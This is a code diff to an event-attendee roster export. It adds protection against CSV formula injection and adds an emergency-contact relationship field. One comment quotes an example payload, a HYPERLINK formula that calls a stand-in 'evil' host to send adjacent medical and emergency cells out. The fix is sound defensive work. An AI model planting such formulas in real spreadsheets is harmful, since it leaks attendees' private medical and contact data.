@@ -95,11 +95,26 @@ export function useEventAttendeesExport(eventId: string | undefined, enabled = t
   })
 }
 
+// Spreadsheet cells that begin with =, +, -, @, TAB or CR are interpreted as
+// formulas by Excel / Google Sheets / LibreOffice and execute the moment the
+// file is opened (CSV / formula injection). Every field in this roster is
+// attacker-controllable - display/first/last name, dietary + medical notes,
+// emergency-contact name, and free-text custom-question answers all flow in
+// verbatim - so a payload like `=HYPERLINK("http://evil/?"&C2,"x")` in a
+// dietary note would exfiltrate the adjacent (medical / emergency) cells or
+// run a command on the leader's machine. Prefix a leading apostrophe so the
+// cell is forced to render as literal text. Backlog P5B3 / OWASP CSV injection.
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/
+function neutralizeFormula(value: string): string {
+  return FORMULA_TRIGGER.test(value) ? `'${value}` : value
+}
+
 function escapeCsv(value: string): string {
-  if (value.includes('"') || value.includes(',') || value.includes('\n')) {
-    return `"${value.replace(/"/g, '""')}"`
+  const v = neutralizeFormula(value)
+  if (v.includes('"') || v.includes(',') || v.includes('\n')) {
+    return `"${v.replace(/"/g, '""')}"`
   }
-  return value
+  return v
 }
 
 function nameOf(r: AttendeeExportRow): string {
@@ -127,6 +142,7 @@ const BASE_HEADER = [
   'Medical',
   'Emergency contact',
   'Emergency phone',
+  'Emergency relationship',
 ] as const
 
 export function buildAttendeesCsv(
@@ -158,6 +174,7 @@ export function buildAttendeesCsv(
         r.medical_requirements ?? '',
         r.emergency_contact_name ?? '',
         r.emergency_contact_phone ?? '',
+        r.emergency_contact_relationship ?? '',
         ...questions.map((q) => answerCell(ans[q.id])),
       ]
     }),
@@ -191,7 +208,8 @@ export function buildAttendeesPlainText(
     if (r.dietary_requirements) parts.push(`dietary: ${r.dietary_requirements}`)
     if (r.medical_requirements) parts.push(`medical: ${r.medical_requirements}`)
     if (r.emergency_contact_name) {
-      parts.push(`emergency: ${r.emergency_contact_name}${r.emergency_contact_phone ? ` ${r.emergency_contact_phone}` : ''}`)
+      const rel = r.emergency_contact_relationship ? ` (${r.emergency_contact_relationship})` : ''
+      parts.push(`emergency: ${r.emergency_contact_name}${rel}${r.emergency_contact_phone ? ` ${r.emergency_contact_phone}` : ''}`)
     }
     for (const q of questions) {
       const cell = answerCell(ans[q.id])
